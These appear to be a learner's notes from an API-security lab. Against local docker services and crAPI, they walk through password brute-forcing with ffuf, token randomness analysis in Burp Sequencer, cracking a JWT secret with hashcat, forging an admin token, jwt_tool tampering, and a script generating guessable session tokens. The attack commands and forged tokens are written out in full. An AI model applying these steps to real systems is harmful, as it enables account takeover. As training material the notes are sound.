
Who we are and proving our Identity, like an ID

HTTP Basic Authentication : ***Credentials are just encoded and sent along with each and every HTTP request which is not a good way to protect credentials***
 
Bearer Tokens : Passed in the Authorization Header of HTTP request but typically contain the requester's identity .  One weakness of this approach is that the application implicitly trusts that token is owned by the supplier of the token. If we manage to steal or generate token for some other user, the application wont know about it 

JWT(JSON Web Token), OAuth 2.0 and API keys are all examples of Bearer Tokens


---

### Brute Force

```sh
./cleanup.sh
sudo docker-compose build
sudo docker-compose up
```

Service running on port 9000

Try to login with admin : admin

And we get an invalid password, so we can perform username enumeration
And we can try to brute force the password for user 'admin'

Capture the request withBurp Suite and copy it to a file

```sh
ffuf -r -c -w /usr/share/wordlists/rockyou.txt:FUZZ -request req.txt -request-proto http -fs 31
```

We found a password 
admin : ramirez

Can also use intruder or turbo intruder

We have no rate limiting which is vulnerability in itself

---

### Attacking Tokens

We can try to change our ID if we can change our token

```sh
sudo docker-compose build
sudo docker-compose up
```

Service running on port 9000

We are going to use Burp Suite Sequencer

Login as admin : ramirez and capture the request in Burp Suite
And in response we get a access token

Send request to Sequencer --> Configure --> Highlight the token and press Ok --> Start Live Capture

This sends a lot of request so need to ahve authoriazation for brute forcing uisng sequencer

Click on Analyze after completion --> Check overall result -->It shows overall quality of randomness is very poor so we can inspect more about the token

Analysis Setting --> Base 64 decode before analyzing checkbox tick

From character analysis

![[sequencerbitEntropy.png]]

Very little randomness between characters 0 to 14 and good randomness between characters 15 o 17

Manually analyzing the token 

![[jwtDecode.png]]

It is base 64
First 5 characters look like username
Next looks like time stamp
And and last 3 characters are very random

We can save tokens to a file, read or copy them to Burp Suite Decoder or CyberChef 


---

###  JWT(JSON Web Tokens)

JWT divided into three parts

- Header
- Payload
- Signature

Each part is encoded with base64 and separated by a period '.'

Header : Contains meta data about the token like algorithm used for signing the token and the type of token which in this case is JWT

Payload : Contains the claims about the bearer of the token , example to store their username

For signing, we can use symetric encryption with just one key, or we can use asymetric encryption and sign with private key and use public key to verify it

We send JWT via Authorization HTTP header
Authorization : Bearer \<JWT Token>

Spin up the local web server using node server.js and make the following request

```sh
curl -X POST http://localhost/login -H "Content-Type: application/json" -d '{"username":"user","password":"user"}' 
```

We are returned a JWT in response

```jwt
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzAyMDM3OTQxfQ.khDRzFo0diZ5DoT5JkwEMqlzQjTLLlF36J_12z2gnDo"} 
```

Decoding it gives

{
    "userid": "user",
    "iat": 1702037941
}

```sh
curl -i http://localhost/dashboard -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzAyMDM3OTQxfQ.khDRzFo0diZ5DoT5JkwEMqlzQjTLLlF36J_12z2gnDo"
```

response : {"message":"Welcome to your dashboard user"}
We get this cause out token was valid

We can change the userid : admin , to admin and if the signature isnt being verfied, we will get welcome to dashboard, but here the signature is being b]verfied so we get an error

If signature signed with a weak secret, the token can be forged

To crack the key for JWT using hashcat

```sh
hashcat -a 0 -m 16500 hash.txt /usr/share/wordlists/rockyou.txt
```

-m : 16500 for JWT
-a : dictionary attack

To view the token 

```sh
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt --show
```

response : ucyxu6

Go to jwt.io and forge the token with the key found and change user type to admin 

Token forged for admin = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJhZG1pbiIsImlhdCI6MTcwMjAzNzk0MX0.dLKQQgByZaynjmtg0ixj5AjFu-5TWV95kfWTfUDFsKQ

```sh
curl -i http://localhost/dashboard -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJhZG1pbiIsImlhdCI6MTcwMjAzNzk0MX0.dLKQQgByZaynjmtg0ixj5AjFu-5TWV95kfWTfUDFsKQ"
```

{"message":"Welcome to your dashboard admin"} 

```sh
sudo ln -s /opt/jwt_tool/jwt_tool.py /usr/local/sbin/jwt_tool
```

***To access JWT directly in any directory, we just added it to our path***


##### Using JWT Tool

Login to crAPI

```sh 
jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhQGIuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDIwMzk4NzksImV4cCI6MTcwMjY0NDY3OX0.bjyqwsgh56jBRHH70SmJV9a3BBbh0BtKKS41hbTp4Itn-KtoGrrWNmS_3Kn_DyTahuNlN8v7ye0xR3On-jKiRj_VSoEW_zoAcxPFOJ9m1cM-XAWjBRMYCwlZXCclf91YmXpOmk-45vPpPEMaKvfqoEs-IsBaiBM7stTZq6Usx_1LvDMSNt6bav7ksNLa5BxJFS5XV3kOxwoNR9o-R6Ejz3EyTeQX0IAdbY3qodLXgK6xG1FXi1q4Ii89VkxHObzS6Ea5zjtE0VjKcwOfgiRvzv7AOeZ-JaWZEG-y2VRHHkBkOUwS8mjf_xPx1L7lAbjq9esVeoN9RbxbPtBU0b9wog
```

![[jwt_tool.png]]



And returns the information in the header and payload of JWT

To tamper with the Token

```sh
jwt_tool eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhQGIuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDIwMzk4NzksImV4cCI6MTcwMjY0NDY3OX0.bjyqwsgh56jBRHH70SmJV9a3BBbh0BtKKS41hbTp4Itn-KtoGrrWNmS_3Kn_DyTahuNlN8v7ye0xR3On-jKiRj_VSoEW_zoAcxPFOJ9m1cM-XAWjBRMYCwlZXCclf91YmXpOmk-45vPpPEMaKvfqoEs-IsBaiBM7stTZq6Usx_1LvDMSNt6bav7ksNLa5BxJFS5XV3kOxwoNR9o-R6Ejz3EyTeQX0IAdbY3qodLXgK6xG1FXi1q4Ii89VkxHObzS6Ea5zjtE0VjKcwOfgiRvzv7AOeZ-JaWZEG-y2VRHHkBkOUwS8mjf_xPx1L7lAbjq9esVeoN9RbxbPtBU0b9wog -T
```

***The Algo used is RS256 which uses asymetric encryption and we dont have the key to sign***
so we just enter a new random key

We can use this if signature not verified

Send request to an endpoint that verifies the token 


```sh
jwt_tool -t http://localhost:8888/identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhQGIuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDIwMzk4NzksImV4cCI6MTcwMjY0NDY3OX0.bjyqwsgh56jBRHH70SmJV9a3BBbh0BtKKS41hbTp4Itn-KtoGrrWNmS_3Kn_DyTahuNlN8v7ye0xR3On-jKiRj_VSoEW_zoAcxPFOJ9m1cM-XAWjBRMYCwlZXCclf91YmXpOmk-45vPpPEMaKvfqoEs-IsBaiBM7stTZq6Usx_1LvDMSNt6bav7ksNLa5BxJFS5XV3kOxwoNR9o-R6Ejz3EyTeQX0IAdbY3qodLXgK6xG1FXi1q4Ii89VkxHObzS6Ea5zjtE0VjKcwOfgiRvzv7AOeZ-JaWZEG-y2VRHHkBkOUwS8mjf_xPx1L7lAbjq9esVeoN9RbxbPtBU0b9wog" -M at
```

From tests, it reveals that application is not checking the signatures

![[jwt_toolAttack.png]]

broken signature response same as correct token response

Since signature not being checked, we can change email field to that of a diffrent user 


---

### Challenge


##### Brute Force Challenge 

We have username enumeration

copy the request file from burp suite and to fuzzing

```sh
ffuf -c -w /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt:FUZZ -request req.txt -request-proto http -fs 31
```

Found username : jeremy
Now fuzz for the password

```sh
ffuf -c -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-100000.txt:FUZZ -request req.txt -request-proto http -fs 31
```

Password : 07061955


##### API Token Analysis Challenge

login with admin : ramirez
Given hint : jeremy logs in at the same time as the admin

And we get a base64 encoded token

Decoded value : admin-17:36:12-chk

So username-TimeStamp-Random3Alphabets

Generate all possible combinations of 3 alphabets

```python
#!/usr/bin/env python3

import base64

chars = 'abcdefghijklmnopqrstuvwxyz'
prefix = 'jeremy-17:36:12-'
perms = []

for i in range(len(chars)):
	for j in range(len(chars)):
		for k in range(len(chars)):
			perms.append(prefix+ chars[i] + chars [j] + chars [k])
			
for perm in perms:
	print(base64.b64encode(perm.encode()).decode())
```


Output the contents to token.txt

We want to encode our data as base64 and we can do that in payload processing in burp suite

```sh
ffuf -request req.txt -request-proto http -w tokens.txt:FUZZ
```